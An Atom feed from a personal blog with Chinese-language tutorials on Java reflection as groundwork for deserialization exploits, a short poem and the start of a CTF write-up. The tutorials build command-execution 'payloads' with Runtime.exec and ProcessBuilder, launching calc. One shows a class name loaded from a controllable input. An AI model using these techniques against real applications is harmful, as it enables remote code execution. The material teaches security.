<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Nack0c&#39;s home</title>
  
  <subtitle>ChenQing Hou</subtitle>
  <link href="https://nack0c.github.io/atom.xml" rel="self"/>
  
  <link href="https://nack0c.github.io/"/>
  <updated>2023-05-17T12:30:26.630Z</updated>
  <id>https://nack0c.github.io/</id>
  
  <author>
    <name>Nack0c</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>反射篇-3</title>
    <link href="https://nack0c.github.io/year/05/17/Java-%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%B0%84%E7%AF%87/%E5%8F%8D%E5%B0%84%E7%AF%87(3)/%E5%8F%8D%E5%B0%84%E7%AF%87(3)/"/>
    <id>https://nack0c.github.io/year/05/17/Java-%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%B0%84%E7%AF%87/%E5%8F%8D%E5%B0%84%E7%AF%87(3)/%E5%8F%8D%E5%B0%84%E7%AF%87(3)/</id>
    <published>2023-05-17T12:40:45.000Z</published>
    <updated>2023-05-17T12:30:26.630Z</updated>
    
    <content type="html"><![CDATA[<p>  延续上次简单的命令执行 payload ，遗留下来两个问题：</p><ul><li>如果一个类没有无参构造方法，也没有类似于单例模式里的静态方法，我们怎么通关反射实例化该类呢？</li><li>如果一个方法或构造方法是私有方法，我们是否能执行它？</li></ul><div class="note success simple"><p>第一个问题，我们需要用到一个新的反射方法 getConstructor 。<br>和 getMethod 类似，getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载，所以必须用参数列表类型才能唯一确定一个构造函数。<br>获取构造函数后，我们使用 newInstance 来执行。</p></div><p>Java 重载：方法重载指同一个类中定义的多个方法之间的关系,满足下列条件的多个方法相互构成重载: 多个方法在同一个类中 多个方法具有相同的方法名 多个方法的参数不相同,类型不同或者数量不同。</p><div class="note info simple"><p>比如，我们常用的另一种执行命令的方式 PorcessBuilder ，我们使用反射来获取其构造函数，然后调用 start() 来执行命令。</p></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>))).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到 ProcessBuilder 有两个构造函数：</p><ul><li>public ProcessBuilder(List<String> command)</li><li>public ProcessBuilder(String… command)</li></ul><p><img src="https://i.328888.xyz/2023/05/17/VVktMV.png" alt="image.png"><br>上面用到了第一个形式的构造函数，所以我们在 getConstructor 传入的是 List.class 。<br>但是我们看到，前面的 payload 用到了强制类型转换，有时候我们利用漏洞的时候是没有这种语法的，所以我们仍需利用反射完成这一步。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"><span class="comment">//        ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc&quot;))).start();</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">calc</span> <span class="operator">=</span> clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(calc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br> 通过 getMethod(“start”) 获取到 start 方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object 了。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;)).start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>那么我们如果要使用 public ProcessBuilder(String… command) 这个构造函数，需要怎样用反射执行呢？<br>这又涉及到 Java 里的可变长参数（varargs）了。正如其他语言一样，Java也支持可变长参数，就是当你定义函数的时候不确定参数数量的时候，可以使用 … 这样的语言来表示 ”这个函数的参数个数是可变的“。<br>对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，下面两种写法在底层是等价的（也就不能重载）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span> <span class="params">(String[] names)</span>&#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span> <span class="params">(String... names)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><br>也由此，如果我们有一个数组，想传给 hello 函数，只需<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String names[] = &#123;<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>&#125;;</span><br><span class="line">hello(names);</span><br></pre></td></tr></table></figure></p><p>那么对于反射来说，如果要获取的布标函数里包含可变长参数，我们认为它是数组就行了。<br>所以我们将字符串数组类 String[].class 传给 getContructor ，获取 ProcessBuilder 的第二种构造函数：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">class.getConstrctor(<span class="string">&quot;String[].class&quot;</span>);</span><br></pre></td></tr></table></figure><br>在调用 newInstance 的时候，因为这个函数本身接受的是一个可变长参数，我们传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，payload 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure><br>反射编写：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> </span><br><span class="line">    clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(instance);</span><br></pre></td></tr></table></figure></p><p>继续说上面提到的第二个问题，如果一个方法或构造方法是私有方法，我们是否能执行它呢？<br>这就涉及到 getDeclared 系列的反射了，与普通的 getMethod 、getConstructor 的区别是：</p><ul><li>getMethod 系列方法获取的是当前类中所有公共方法，包括父类继承的方法。</li><li>getDeclaredMethod 系列方法获取的就是当前类中的 ”声明“ 的方法，是实写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了。</li></ul><p>举个例子，我们之前说过 Runtime 这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来获取对象。其实现在我们也可以直接用  getDeclaredConstructor 来获取这个私有的构造方法来实例 化对象，进而执行命令.<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(constructor.newInstance(),<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><br> 可见，这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用。  </p>]]></content>
    
    
    <summary type="html">Java反射学习之路~</summary>
    
    
    
    
    <category term="Java基础知识" scheme="https://nack0c.github.io/tags/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>反射篇-2</title>
    <link href="https://nack0c.github.io/year/05/17/Java-%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%B0%84%E7%AF%87/%E5%8F%8D%E5%B0%84%E7%AF%87(2)/%E5%8F%8D%E5%B0%84%E7%AF%87(2)/"/>
    <id>https://nack0c.github.io/year/05/17/Java-%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%B0%84%E7%AF%87/%E5%8F%8D%E5%B0%84%E7%AF%87(2)/%E5%8F%8D%E5%B0%84%E7%AF%87(2)/</id>
    <published>2023-05-17T11:10:17.000Z</published>
    <updated>2023-05-17T12:30:26.630Z</updated>
    
    <content type="html"><![CDATA[<div class="note orange icon-padding simple"><i class="note-icon fas fa-battery-half"></i><p>我们接着上一节，上次谈到了 forName.<br>  在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。<br>  获得类以后，我们可以继续使用反射来获取这个类中的属性、方法，也可以实例化这个类，并调用方法。  </p></div><div class="note red icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p> class.newInstance() 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是：  </p><ul><li>你使用的类没有无参构造函数  </li><li>你使用的类构造函数是私有的  </li></ul><p>最最常见的就是 java.lang.Runtime  这个类在我们构造命令执行Payload的时候很常见，但我们不能直接这样来执行命令:</p></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">calc</span> <span class="operator">=</span> method.invoke(clazz.newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.328888.xyz/2023/05/17/VVkioX.png" alt="image.png"><br><strong>原因就是 Runtime 是私有的！！！</strong></p><blockquote><p>  有同学就比较好奇，为什么会有类的构造方法是私有的，难道他不想让用户使用这个类吗？这其实涉及 到很常见的设计模式：“单例模式”。（有时候工厂模式也会写成类似） 比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainDB</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">TrainDB</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainDB</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="title function_">TrainDB</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 建立连接的代码...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建 立多个数据库连接。<br>  回到正题，Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对象。我们将上述Payload进行修改即可正常执行命令了</p></blockquote><p><img src="https://i.328888.xyz/2023/05/17/VVkyjJ.png" alt="image.png"><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里用到了 getMethod 和 invoke 方法。</p><h4 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h4><p class="div-border top red">getMethod 的作用是通关反射获取一个类的某个特定的公有方法（public）。而学过Java的同学应该清楚，Java中 支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表。  </p><p>比如：Runtime.getRuntime 有6个 exec 方法的重载，它们传入的参数个数、类型也是不同的。<br><img src="https://i.328888.xyz/2023/05/17/VVkAYA.png" alt="image.png"></p><h4 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h4><div class="note warning simple"><p>invoke 的作用是执行方法，它的第一个参数是：</p><ul><li>如果这个方法是一个普通方法，那么第一个参数是类对象；</li><li><p>如果这个方法是一个静态方法，那么第一个参数是类；</p><p>这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。  </p></li></ul></div><p> 所以我们将上述命令执行的Payload分解一下就是：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">invoke</span> <span class="operator">=</span> method1.invoke(clazz);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        method2.invoke(invoke,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        Method method = clazz.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        method.invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">Java反射学习之路~</summary>
    
    
    
    
    <category term="Java基础知识" scheme="https://nack0c.github.io/tags/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>反射篇-1</title>
    <link href="https://nack0c.github.io/year/05/17/Java-%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%B0%84%E7%AF%87/%E5%8F%8D%E5%B0%84%E7%AF%87(1)/%E5%8F%8D%E5%B0%84%E7%AF%87(1)/"/>
    <id>https://nack0c.github.io/year/05/17/Java-%E5%9F%BA%E7%A1%80/%E5%8F%8D%E5%B0%84%E7%AF%87/%E5%8F%8D%E5%B0%84%E7%AF%87(1)/%E5%8F%8D%E5%B0%84%E7%AF%87(1)/</id>
    <published>2023-05-17T10:22:18.000Z</published>
    <updated>2023-05-17T12:30:26.630Z</updated>
    
    <content type="html"><![CDATA[<div class="note red icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>Java安全可以从反序列化漏洞开始说起，反序列化漏洞⼜可以从反射开始说起。 反射是⼤多数语⾔⾥都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有 ⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将Java这种静态语⾔附加上动态特性。 </p></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">    classzz.getMethod(methodName).invoke(class.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的例子中，演示了几个反射中很重要的方法：</p><blockquote><ul><li>获取类的方法：forName</li><li>实例化类对象的方法：newInstance</li><li>获取函数的方法：getMethod</li><li>执行函数的方法：invoke</li></ul></blockquote><p>forName 不是获取“类”的唯一途径，通常来说我们有如下三种方式获取一个“类”，也就是 java.lang.Class 对象：<br><div class="note red icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><ul><li>obj.getClass()    <ul><li>如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过  obj.getClass()    来获取它的类。</li></ul></li><li>Test.class<ul><li>如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。  </li></ul></li><li>Class.forName()<ul><li>如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取  。</li></ul></li></ul></div><br>关于 forName<br>forName 有两个函数重载</p><ul><li>Class&lt;?&gt; forName(String name)</li><li>Class&lt;?&gt; forName(String name, <strong>boolean</strong> initialize, ClassLoader loader )<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line">// 等于</span><br><span class="line">Class.forName(className,true,currentLoader)</span><br></pre></td></tr></table></figure>默认情况下， forName 的第一个参数是类名；第二个参数标识是否初始化；第三个参数就是 ClassLoader.<div class="note info simple"><p>ClassLoader<br>  “加载器”，告诉Java虚拟机如何加载这个类。</p></div></li></ul><p>关于 initialize = true.<br><div class="note red icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>可以理解为类的初始化。下面举一个例子。</p></div><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Empty block initial %s\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Static initial %s\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Initial %s\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们举这个例子的目的在于查看 代码块{}、构造函数、static{} 三者的执行顺序。<br><img src="https://i.328888.xyz/2023/05/17/VVZ7xw.png" alt="image-1.png"><br>那么，假设我们有下面这段函数，其中参数 <strong>name </strong>可控。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        String[] commands = &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line"><span class="comment">//        String[] commands = &#123;&quot;touch&quot;,&quot;/tmp/success&quot;&#125;;</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(commands);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class.forName(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://i.328888.xyz/2023/05/17/VVZLcF.png" alt="image-2.png"> </p>]]></content>
    
    
    <summary type="html">Java反射学习之路~</summary>
    
    
    
    
    <category term="Java基础知识" scheme="https://nack0c.github.io/tags/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>阳光不燥，微风正好</title>
    <link href="https://nack0c.github.io/year/05/15/%E7%94%9F%E6%B4%BB/%E9%98%B3%E8%B0%B7%E6%98%8E%E5%AA%9A/"/>
    <id>https://nack0c.github.io/year/05/15/%E7%94%9F%E6%B4%BB/%E9%98%B3%E8%B0%B7%E6%98%8E%E5%AA%9A/</id>
    <published>2023-05-15T17:22:18.000Z</published>
    <updated>2023-05-17T12:30:26.630Z</updated>
    
    <content type="html"><![CDATA[<h1 id="夏至"><a href="#夏至" class="headerlink" title="夏至"></a>夏至</h1><blockquote><p>一生的时间很短<br> 短到不过是两颗心之间的距离</p></blockquote><div class="tip "><p>default</p></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;夏至&quot;&gt;&lt;a href=&quot;#夏至&quot; class=&quot;headerlink&quot; title=&quot;夏至&quot;&gt;&lt;/a&gt;夏至&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;一生的时间很短&lt;br&gt; 短到不过是两颗心之间的距离&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;t</summary>
      
    
    
    
    
    <category term="生活" scheme="https://nack0c.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>2022-第二届网刃杯</title>
    <link href="https://nack0c.github.io/year/05/13/CTF/2022-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/"/>
    <id>https://nack0c.github.io/year/05/13/CTF/2022-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/</id>
    <published>2023-05-13T17:27:00.000Z</published>
    <updated>2023-05-17T12:30:26.630Z</updated>
    
    <content type="html"><![CDATA[<p><img src="CTF/2022-第二届网刃杯/images/image.png" alt="image.png"><br><a name="kTMJT"></a></p><h2 id="ICS"><a href="#ICS" class="headerlink" title="ICS"></a>ICS</h2><p><a name="DSfng"></a></p><h3 id="1-ncsubj"><a href="#1-ncsubj" class="headerlink" title="1.ncsubj"></a>1.ncsubj</h3><p>wireshark 打开，追踪 S7COMM 流，发现奇怪的字符，截取出来<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650887092330-26d3ee8e-acb2-40ff-815d-05a7fd8d5b09.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=179&amp;id=u9bbcf393&amp;originHeight=543&amp;originWidth=1546&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=100108&amp;status=done&amp;style=none&amp;taskId=u3bd84fab-f731-482f-b1f3-3b3648820e8&amp;title=&amp;width=510.60003662109375" alt="image.png"><br />base64 decode-&gt;&gt;<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650887328567-8d0e5daa-7a03-4103-9770-d4a56afa9489.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=64&amp;id=ud24ce683&amp;originHeight=109&amp;originWidth=653&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=16359&amp;status=done&amp;style=none&amp;taskId=u3f15b389-e3cb-4b6a-91cf-00b6d8c218a&amp;title=&amp;width=384.3999938964844" alt="image.png"><br />rot13 decode-&gt;&gt;<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650887301060-2bc07870-7af4-4609-bb71-e6f8372ec113.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=211&amp;id=u52ee5c5a&amp;originHeight=573&amp;originWidth=1457&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=45416&amp;status=done&amp;style=none&amp;taskId=u1574be6a-29df-419c-8df2-ae1dafe5e55&amp;title=&amp;width=537.6000366210938" alt="image.png"><br />flag{whatancsubject}<br><a name="TMDyv"></a></p><h3 id="2-LED-BOOM"><a href="#2-LED-BOOM" class="headerlink" title="2.LED_BOOM"></a>2.LED_BOOM</h3><p><img 